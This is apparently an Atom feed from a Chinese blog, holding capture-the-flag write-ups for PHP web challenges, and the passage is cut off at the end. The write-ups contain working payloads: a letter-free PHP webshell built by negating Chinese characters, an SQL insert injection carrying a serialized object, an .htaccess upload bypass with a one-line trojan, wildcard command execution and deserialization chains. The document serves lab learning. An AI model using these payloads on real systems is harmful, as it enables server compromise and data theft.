<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1__/\/のblog</title>
  
  <subtitle>LN</subtitle>
  <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
  
  <link href="http://lll-nnn.github.io/"/>
  <updated>2021-05-19T16:11:47.175Z</updated>
  <id>http://lll-nnn.github.io/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GetShell</title>
    <link href="http://lll-nnn.github.io/2021/05/19/BUU87/"/>
    <id>http://lll-nnn.github.io/2021/05/19/BUU87/</id>
    <published>2021-05-19T03:35:12.000Z</published>
    <updated>2021-05-19T16:11:47.175Z</updated>
    
    <content type="html"><![CDATA[<h2 id="o-o"><a href="#o-o" class="headerlink" title="o)o"></a>o)o</h2><p>打开环境，发现是文件上传，还给了部分源码</p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d40dccf7a06348d1.png">   </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span>($contents=file_get_contents($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;    $data=substr($contents,<span class="hljs-number">5</span>);    <span class="hljs-keyword">foreach</span> ($black_char <span class="hljs-keyword">as</span> $b) &#123;        <span class="hljs-keyword">if</span> (stripos($data, $b) !== <span class="hljs-literal">false</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);        &#125;    &#125;     &#125;</code></pre></code></pre><p>从给的源码得知会检查文件的内容第六位之后   </p><p>看WP似乎是过滤了数字和字母      </p><p>可用的符号<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>       </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神的无字母数字gethell</a>   </p><p>利用中文和取反操作得到字母    </p><p><code>echo ~(&#39;北&#39;)[1];</code>–&gt;s     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);$str = <span class="hljs-string">&#x27;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;mb_strlen($str, <span class="hljs-string">&#x27;utf-8&#x27;</span>); $i++)&#123;    $st = mb_substr($str, $i,<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>);    $a = ~($st);    $b = $a[<span class="hljs-number">1</span>];<span class="hljs-comment">#取汉字的第一位</span>    <span class="hljs-keyword">if</span>($b==$_GET[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-comment">#$_GET[&#x27;a&#x27;]想要得到的字符</span>    &#123;        <span class="hljs-keyword">echo</span> $st;<span class="hljs-keyword">exit</span>;      <span class="hljs-comment">//~($st)[1]</span>    &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><a href="https://www.leavesongs.com/THINK/answer.html?page=1">P神</a>      </p><p>上面的EXP使用方法      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/608d549c7d463779.png">     </p><p>构造payload<code>&lt;?=system($_POST[system]);&gt;</code><br>先构造数字1–&gt;<code>$__=[];$____=$__==$__;</code><br>system:<code>$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];</code>       </p><p>_POST:<code>$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];</code>       </p><p><code>system($_POST[system])</code>:<code>$_($$___[$_])</code>      </p><p>最终的payload：<code>&lt;?=$__=[];$____=$__==$__;$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];$_($$___[$_]);</code>    </p><p>flag不在根目录下，在环境变量中<code>env</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/dbbe16c2fd333a78.png">     </p><p>payload:<code>eval($_POST[1])</code>就不行，原因是PHP支持<code>变量函数</code>,也就是通过一个变量保存函数名，在变量后加上<code>()</code>即可调用函数；但是<code>eval</code>并不是一个函数，是PHP语法结构的一部分。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;o-o&quot;&gt;&lt;a href=&quot;#o-o&quot; class=&quot;headerlink&quot; title=&quot;o)o&quot;&gt;&lt;/a&gt;o)o&lt;/h2&gt;&lt;p&gt;打开环境，发现是文件上传，还给了部分源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/202</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="getshell" scheme="http://lll-nnn.github.io/tags/getshell/"/>
    
    <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>不是文件上传</title>
    <link href="http://lll-nnn.github.io/2021/05/15/BUU86/"/>
    <id>http://lll-nnn.github.io/2021/05/15/BUU86/</id>
    <published>2021-05-14T16:02:50.000Z</published>
    <updated>2021-05-16T07:37:39.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>题目说不是文件上传，看一下<code>www.zip</code>   </p><p>没有？？</p><p>看了WP，是<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png">   </p><p><code>github</code>上搜索得到源码<img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png">      </p><p>主要是<code>helper.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;config.txt&quot;</span>;    <span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params">$input=<span class="hljs-string">&quot;file&quot;</span></span>)</span><span class="hljs-function">    </span>&#123;        $fileinfo = <span class="hljs-keyword">$this</span>-&gt;getfile($input);        $array = <span class="hljs-keyword">array</span>();        $array[<span class="hljs-string">&quot;title&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;title&#x27;</span>];        $array[<span class="hljs-string">&quot;filename&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;filename&#x27;</span>];        $array[<span class="hljs-string">&quot;ext&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;ext&#x27;</span>];        $array[<span class="hljs-string">&quot;path&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;path&#x27;</span>];        $img_ext = getimagesize($_FILES[$input][<span class="hljs-string">&quot;tmp_name&quot;</span>]);        $my_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;$img_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;$img_ext[<span class="hljs-number">1</span>]);        $array[<span class="hljs-string">&quot;attr&quot;</span>] = serialize($my_ext);        $id = <span class="hljs-keyword">$this</span>-&gt;save($array);        <span class="hljs-keyword">if</span> ($id == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">$input</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($input))&#123;            $rs = <span class="hljs-keyword">$this</span>-&gt;check($_FILES[$input]);        &#125;        <span class="hljs-keyword">return</span> $rs;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$info</span>)</span><span class="hljs-function">    </span>&#123;        $basename = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);        $filename = $info[<span class="hljs-string">&quot;name&quot;</span>];        $ext = substr(strrchr($filename, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);        $cate_exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);        <span class="hljs-keyword">if</span>(!in_array($ext,$cate_exts))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);        &#125;        $title = str_replace(<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;&#x27;</span>,$filename);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;$title,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;$ext,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(!$data || !is_array($data))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        $id = <span class="hljs-keyword">$this</span>-&gt;insert_array($data);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        $con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);        <span class="hljs-keyword">if</span> (mysqli_connect_errno($con))         &#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());        &#125;        $sql_fields = <span class="hljs-keyword">array</span>();        $sql_val = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;            $key_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $key);            $value_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value);            $sql_fields[] = <span class="hljs-string">&quot;`&quot;</span>.$key_temp.<span class="hljs-string">&quot;`&quot;</span>;            $sql_val[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.$value_temp.<span class="hljs-string">&quot;&#x27;&quot;</span>;        &#125;        $sql = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_fields)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_val)).<span class="hljs-string">&quot;)&quot;</span>;        mysqli_query($con, $sql);        $id = mysqli_insert_id($con);        mysqli_close($con);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params">$path</span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;            <span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>        &#125;        $content = file_get_contents($path);        <span class="hljs-keyword">echo</span> $content;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment"># Read some config html</span>        <span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>最后的这里可以利用<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png"></p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> helper();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>然后是sql <code>insert </code> 注入   </p><p>正常上传图片的sql语句为<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIM截图20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p><p>其中title没有做什么处理<br>所以构造<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>文件名不能有双引号，所以进行十六进制编码    </p><p>上传图片，用burp改一下文件名，在<code>show.php</code>得到flag     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7518b270a41d8eaa.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;__--__&quot;&gt;&lt;/a&gt;&lt;code&gt;__--__&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;题目说不是文件上传，看一下&lt;code&gt;www.zip&lt;/code&gt;   &lt;/p&gt;
&lt;p&gt;没有？？&lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Wicctf</title>
    <link href="http://lll-nnn.github.io/2021/05/11/wicctf/"/>
    <id>http://lll-nnn.github.io/2021/05/11/wicctf/</id>
    <published>2021-05-11T09:00:11.000Z</published>
    <updated>2021-05-13T15:35:36.167Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>文件上传题<br>给了源码，其中有些配置文件看不懂，放弃了   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png">     </p><p>一开始上传PHP文件，上传成功了，但访问返回了文件中的内容，应该是没有解析PHP文件     </p><p>这时候就应该找apache中的相关配置了    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png">      </p><p>这个设为了<code>off</code>会限制目录下的PHP文件没有执行权限<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png">        </p><p>通过传入<code>.htaccess</code>文件来覆盖配置文件中的设置（<code>.htaccess</code>文件作用所在的目录和所有子目录，指令按查找顺序依次生效，所以子目录下的<code>.htaccess</code>可能会覆盖父目录下或者配置文件中的指令）      </p><pre><code>&lt;Files &quot;*.gif&quot;&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpphp_flag engine on&lt;/Files&gt;</code></pre><p><code>&lt;file&gt;</code>标签比<code>&lt;directory&gt;</code>优先级高     </p><p>然后上传一句话木马，文件后缀名改为<code>.gif</code>      </p><p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png">        </p><p><a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>);     &#125;    <span class="hljs-keyword">eval</span>($code);&#125;</code></pre></code></pre><p>过滤了字母数字还有<code>_@$</code>    </p><p>试了下异或，不行；url取反也不行，就没招了…….      </p><p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p><p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png">    </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">无字母数字webshell之提高篇—P神</a></p><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png">       </p><p>停电了会发生什么    </p><p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p><p>扫到<code>.index.php.swp</code>       </p><p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;        <span class="hljs-comment">// initialise variables</span>        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);            &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);        fclose($fd);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;    <span class="hljs-keyword">public</span> $weblogfile;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);        <span class="hljs-keyword">return</span> $str;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);$log_unser = unserialize($log);<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;body&gt;&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="hljs-number">14</span>级大风停电了.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p><code>readfile</code>  、 flag在<code>/flag</code>      </p><p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p><p>flag过滤了，双写即可绕过    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span><span 